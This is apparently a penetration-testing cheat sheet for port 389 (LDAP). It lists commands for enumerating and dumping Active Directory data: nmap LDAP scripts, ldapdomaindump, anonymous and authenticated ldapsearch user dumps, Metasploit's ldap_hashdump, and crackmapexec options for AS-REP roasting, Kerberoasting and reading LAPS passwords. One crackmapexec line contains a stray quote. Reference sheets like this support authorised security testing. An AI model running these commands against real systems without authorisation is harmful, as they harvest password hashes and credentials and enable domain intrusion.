# Port 389 | LDAP

### Nmap

No credentials, see what can be pulled.

```bash
nmap -n -sV --script "ldap* and not brute" <IP>  
```

### ldapdomaindump&#x20;

```bash
# With Credentials
ldapdomaindump -u security.local\\<User> -p '<Password>' ldap://<IP>

# Without credentials
ldapdomaindump ldap://<IP>
```

### ldapsearch

```bash
# Get all users
ldapsearch -x -H ldap://<IP> -D '<Domain>\<User>' -w '<Password>' -b 'DC=security,DC=local'

# Get all users and cleanup output
ldapsearch -x -H ldap://<IP> -D '<Domain>\<User>' -w '<Password>' -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'

# Without credentials
ldapsearch -x -H ldap://<IP> -b 'DC=security,DC=local'
ldapsearch -x -H ldap://<IP> -b 'DC=security,DC=local' | grep userPrincipalName | sed 's/userPrincipalName: //'
```

### Metasploit

```
use auxiliary/gather/ldap_hashdump
```

### Crackmapexec

```bash
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> --admin-count
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --asreproast ASREPROAST
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --groups
crackmapexec ldap'<IP> -u <User> -p <Password> --kdcHost <Host>  --kerberoasting KERBEROASTING
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --password-not-required
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --trusted-for-delegation
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --users

# Modules
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M get-desc-users
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M laps
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M ldap-signing
```
